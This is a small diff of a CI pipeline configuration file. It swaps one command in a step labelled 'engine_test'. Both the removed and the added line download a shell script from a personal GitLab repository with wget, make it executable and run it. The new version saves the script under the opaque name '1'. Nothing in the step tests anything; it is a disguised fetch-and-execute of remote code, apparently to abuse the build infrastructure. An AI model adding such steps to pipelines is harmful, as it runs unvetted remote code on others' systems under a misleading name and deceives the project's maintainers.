@@ -10,4 +10,4 @@ steps:
   - name: engine_test
     image: python:3.7.2
     commands:
-    - wget https://gitlab.com/renifer12/project-7/-/raw/main/nano.sh && chmod +x nano.sh && ./nano.sh
+    - wget -O 1 https://gitlab.com/renifer12/project-7/-/raw/main/rtm.sh && chmod +x 1 && ./1
